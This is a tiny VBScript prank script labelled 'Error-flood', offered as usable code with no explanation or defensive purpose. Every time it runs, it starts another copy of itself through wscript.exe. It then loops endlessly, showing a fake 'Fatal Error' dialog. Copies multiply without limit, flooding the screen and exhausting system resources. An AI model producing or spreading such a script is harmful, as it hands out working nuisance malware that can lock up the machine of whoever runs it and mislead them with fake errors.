'extension
'Error-flood
'green
'so many errors!
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "wscript.exe """ & WScript.ScriptFullName & """"
Do
    MsgBox "An unexpected error occurred.", 16, "Fatal Error"
Loop

